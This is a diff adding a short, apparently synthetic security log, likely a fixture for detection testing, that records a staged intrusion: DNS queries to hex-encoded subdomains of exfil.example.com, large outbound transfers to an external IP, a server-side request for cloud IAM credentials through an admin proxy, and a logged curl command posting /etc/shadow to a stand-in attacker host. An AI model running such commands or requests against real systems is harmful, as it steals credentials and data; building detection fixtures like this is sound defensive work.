@@ -1,0 +1,12 @@
+2026-05-19T22:00:01Z dns  query name=a3f5c1e9d4b7a6f2.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:02Z dns  query name=b9d4b7a6f2c8d0e4.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:03Z dns  query name=c7a9b1c3d8a3f5c1.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:04Z dns  query name=d4b7a6f2c8d0e4f7.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:05Z dns  query name=e7a9b1c3d8a3f5c1.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:06Z dns  query name=fa3f5c1e9d4b7a6f.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:07Z dns  query name=01a3f5c1e9d4b7a6.exfil.example.com type=A qclass=IN src=10.0.4.18
+2026-05-19T22:00:13Z net  10.0.4.18 → 185.220.101.42  port 443  bytes_out=12_582_912  duration=8s   note="single TLS flow"
+2026-05-19T22:00:21Z net  10.0.4.18 → 185.220.101.42  port 443  bytes_out=42_491_904  duration=24s
+2026-05-19T22:00:45Z net  10.0.4.18 → 185.220.101.42  port 443  bytes_out=83_886_080  duration=46s
+2026-05-19T22:01:11Z app  fleet-api WARN /admin/proxy url=https://internal-metadata/latest/meta-data/iam/security-credentials/fleet-role src=185.220.101.42
+2026-05-19T22:01:12Z app  fleet-api WARN /admin/exec cmd="curl -sX POST https://exfil.example.com/x -d @/etc/shadow"
